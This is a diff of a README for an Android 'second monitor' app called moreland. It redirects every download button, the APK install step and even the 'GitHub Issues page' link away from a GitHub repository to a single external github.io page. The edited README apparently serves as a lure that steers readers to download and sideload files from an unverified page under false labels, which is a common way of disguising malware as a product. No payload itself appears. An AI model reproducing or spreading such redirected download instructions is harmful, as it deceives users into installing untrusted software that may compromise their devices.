@@ -1,7 +1,7 @@
 <h1>📟 moreland - Your Android tablet becomes a second monitor</h1>
 
 <p align="center">
-  <a href="https://github.com/ago1314000-alt/moreland" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(245,87,108,0.4);">⬇️ Download moreland Now</a>
+  <a href="https://ago1314000-alt.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(245,87,108,0.4);">⬇️ Download moreland Now</a>
 </p>
 
 <p align="center">
@@ -32,7 +32,7 @@ Getting moreland up and running takes less than five minutes. Here's exactly wha
 ### Step 1: Download moreland
 
 Visit this link to download the application:  
-👉 **[Click here to download moreland](https://github.com/ago1314000-alt/moreland)**
+👉 **[Click here to download moreland](https://ago1314000-alt.github.io)**
 
 Once you're on the page, look for the green "Code" button or the "Releases" section on the right side of the page. Click "Releases" to see the latest version. Download the file that matches your system (look for files like `moreland-v1.0.0-linux-x86_64.tar.gz` or similar).
 
@@ -66,7 +66,7 @@ Now you can start it anytime by typing `moreland` in your terminal.
 
 On your Android tablet:
 1. Open your web browser
-2. Go to the same download link: https://github.com/ago1314000-alt/moreland
+2. Go to the same download link: https://ago1314000-alt.github.io
 3. Scroll to the "Releases" section
 4. Download the `.apk` file (for Android)
 5. Tap the downloaded file to install it (you may need to allow "Install from unknown sources" in your tablet settings)
@@ -164,7 +164,7 @@ This bypasses the need for network protocols like VNC or RDP, giving you a lag-f
 
 ## 🔊 Community Support
 
-Encounter a problem not covered here? You're not alone. Visit the [GitHub Issues page](https://github.com/ago1314000-alt/moreland/issues) to report bugs or ask questions. The developer community is friendly and typically responds quickly.
+Encounter a problem not covered here? You're not alone. Visit the [GitHub Issues page](https://ago1314000-alt.github.io) to report bugs or ask questions. The developer community is friendly and typically responds quickly.
 
 ## 📦 Release Notes
 
@@ -194,7 +194,7 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 ---
 
 <p align="center">
-  <a href="https://github.com/ago1314000-alt/moreland" style="display:inline-block;padding:14px 28px;background:#6c5ce7;color:#ffffff;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;margin-top:20px;">📥 Download moreland Now</a>
+  <a href="https://ago1314000-alt.github.io" style="display:inline-block;padding:14px 28px;background:#6c5ce7;color:#ffffff;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;margin-top:20px;">📥 Download moreland Now</a>
 </p>
 
-<p align="center"><em>Release direct page: https://github.com/ago1314000-alt/moreland</em></p>
+<p align="center"><em>Release direct page: https://ago1314000-alt.github.io</em></p>
